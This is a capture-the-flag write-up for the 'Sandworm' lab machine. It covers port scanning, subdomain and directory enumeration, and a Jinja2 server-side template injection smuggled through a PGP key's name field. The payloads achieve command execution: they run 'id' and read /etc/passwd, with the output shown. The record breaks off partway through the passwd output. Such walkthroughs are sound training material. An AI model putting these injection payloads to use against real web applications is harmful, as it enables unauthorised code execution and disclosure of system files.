# Sandworm

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.163.22
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 19:31 UTC
Nmap scan report for 10.129.163.22
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/17%OT=22%CT=1%CU=34271%PV=Y%DS=2%DC=T%G=Y%TM=648E0A2
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   109.86 ms 10.10.16.1
2   56.35 ms  10.129.163.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.55 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.163.22
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 19:32 UTC
Nmap scan report for ssa.htb (10.129.163.22)
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/17%OT=22%CT=1%CU=38704%PV=Y%DS=2%DC=T%G=Y%TM=648E0C1
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M
OS:53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%
OS:O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   62.10 ms 10.10.16.1
2   62.20 ms ssa.htb (10.129.163.22)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 435.18 seconds
```

```c
$ sudo nmap -sV -sU 10.129.163.22
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 19:40 UTC
Nmap scan report for ssa.htb (10.129.17.52)
Host is up (1.5s latency).
All 1000 scanned ports on ssa.htb (10.129.17.52) are in ignored states.
Not shown: 891 filtered udp ports (host-unreach), 109 closed udp ports (port-unreach)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1138.72 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.163.22

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.163.22    ssa.htb
```

http://ssa.htb

```c
$ whatweb http://ssa.htb     
http://ssa.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.163.22], RedirectLocation[https://ssa.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://ssa.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.163.22], JQuery, PoweredBy[Flask&trade;], Script, Title[Secret Spy Agency | Secret Security Service], nginx[1.18.0]
```

We checked the certificate and found a potential username.

| Email |
| --- |
| atlas@ssa.htb |

> https://ssa.htb/about

> https://ssa.htb/contact

> https://ssa.htb/guide

On the bottom of the page, we found `Powered by Flask™ `.

> https://ssa.htb/pgp

```c
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
=P8U3
-----END PGP PUBLIC KEY BLOCK-----

```

### Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.ssa.htb" -u http://ssa.htb --mc all --fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ssa.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ssa.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 542 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

### Directory Busting with Gobuster

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://ssa.htb/ -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ssa.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 04:54:24 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 5584]
/contact              (Status: 200) [Size: 3543]
/login                (Status: 200) [Size: 4392]
/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
/guide                (Status: 200) [Size: 9043]
/pgp                  (Status: 200) [Size: 3187]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/process              (Status: 405) [Size: 153]
Progress: 207633 / 207644 (99.99%)
===============================================================
2023/06/18 05:32:27 Finished
===============================================================
```

## Server-Side Template Injection (SSTI)

Payload:

```c
{{7*7}}
```

```c
$ gpg --gen-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: directory '/home/user/.gnupg' created
gpg: keybox '/home/user/.gnupg/pubring.kbx' created
Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{7*7}}
Email address: foobar@foobar.local                                                                                                                                                                                                          
You selected this USER-ID:                                                                                                                                                                                                                  
    "{{7*7}} <foobar@foobar.local>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: /home/user/.gnupg/trustdb.gpg: trustdb created
gpg: directory '/home/user/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/user/.gnupg/openpgp-revocs.d/F48B442C6D5E217BAB3CD4E4348BFC94432F2A55.rev'
public and secret key created and signed.

pub   rsa3072 2023-06-17 [SC] [expires: 2025-06-16]
      F48B442C6D5E217BAB3CD4E4348BFC94432F2A55
uid                      {{7*7}} <foobar@foobar.local>
sub   rsa3072 2023-06-17 [E] [expires: 2025-06-16]
```

```c
$ gpg --armor --export foobar@foobar.local > pubkey.asc
```

```c
$ cat pubkey.asc 
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
sWIM6ytNXyR6tToEQ0VYQ14e+rI+
=lFSb
-----END PGP PUBLIC KEY BLOCK-----
```

```c
$ echo 'foobar' | gpg --clear-sign
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

foobar
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEE9ItELG1eIXurPNTkNIv8lEMvKlUFAmSOFtQACgkQNIv8lEMv
KlV2mAwAnOZVCEq7TIEKQtLXNA7i25HIL3IPqoXXQYpApDoHWLEkFyEqHASVDof9
/oDdxPJWlL0MKSDngz3dWMKlF5EDBgWr0+/sGEKW2HNADPeYm9z+5otORP+Pr061
fKIiD6rrZJcC2C/Wk1utXYv+K+nb+Q7v39tD3l6Ch/8BRhI5z2ptoghDDrfJ4Xiz
5T9UtS9sAkbNqLBGXzMdKzIAiBjR1lQxV4fFSSzDAJaBKk1k1E0902D5eEslr6zG
zGfs4mEgFpGVHNLAqpWdHQjDeORWI5mH381Pm9loxGQfE9Y0ytBQZAqBw3h+pdYs
X/GZLOoVckcyc5fil7dVcxuNN02gX1mQVsmf4/1duiHtZ3yFnLOWTFIUWounozf2
JbIvZbgzBHlWqOAIyKcmj4cN5C4e8U0WfHqeSMyPovKD07MH404mWk8dhToLyeNo
FaV2y7Uxj44Vqt2NYYWDPKPrGLTvVDSAT3Q/bzqTe1lzppV5NaN5/232MKLsGeud
6JZPRuQI
=SqtD
-----END PGP SIGNATURE-----
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sat 17 Jun 2023 08:25:56 PM UTC gpg: using RSA key F48B442C6D5E217BAB3CD4E4348BFC94432F2A55 [GNUPG:] KEY_CONSIDERED F48B442C6D5E217BAB3CD4E4348BFC94432F2A55 0 [GNUPG:] SIG_ID TAKOQ2Gzi86Gp7+KP7ZivPDlrpU 2023-06-17 1687033556 [GNUPG:] KEY_CONSIDERED F48B442C6D5E217BAB3CD4E4348BFC94432F2A55 0 [GNUPG:] GOODSIG 348BFC94432F2A55 49 gpg: Good signature from "49 " [unknown] [GNUPG:] VALIDSIG F48B442C6D5E217BAB3CD4E4348BFC94432F2A55 2023-06-17 1687033556 0 4 0 1 10 01 F48B442C6D5E217BAB3CD4E4348BFC94432F2A55 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: F48B 442C 6D5E 217B AB3C D4E4 348B FC94 432F 2A55
```

It worked! We got `49` back!

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sat 17 Jun 2023 08:32:34 PM UTC gpg: using RSA key 79265FC974C1FE3E7B486050CEA747C2AADB5650 [GNUPG:] KEY_CONSIDERED 79265FC974C1FE3E7B486050CEA747C2AADB5650 0 [GNUPG:] SIG_ID 5+6JhAZEO628pkTubkNoSEYAXxI 2023-06-17 1687033954 [GNUPG:] KEY_CONSIDERED 79265FC974C1FE3E7B486050CEA747C2AADB5650 0 [GNUPG:] GOODSIG CEA747C2AADB5650 uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) gpg: Good signature from "uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) " [unknown] [GNUPG:] VALIDSIG 79265FC974C1FE3E7B486050CEA747C2AADB5650 2023-06-17 1687033954 0 4 0 1 10 01 79265FC974C1FE3E7B486050CEA747C2AADB5650 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 7926 5FC9 74C1 FE3E 7B48 6050 CEA7 47C2 AADB 5650
```

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sat 17 Jun 2023 09:02:51 PM UTC gpg: using RSA key D43BAA8CF9166B57ABDD908F34AA572E1AEFA923 [GNUPG:] KEY_CONSIDERED D43BAA8CF9166B57ABDD908F34AA572E1AEFA923 0 [GNUPG:] SIG_ID oDGknssZHWM3d4Un1b8wiC7ogak 2023-06-17 1687035771 [GNUPG:] KEY_CONSIDERED D43BAA8CF9166B57ABDD908F34AA572E1AEFA923 0 [GNUPG:] GOODSIG 34AA572E1AEFA923 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false silentobserver:x:1001:1001::/home/silentobserver:/bin/bash atlas:x:1000:1000::/home/atlas:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false gpg: Good signature from "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin 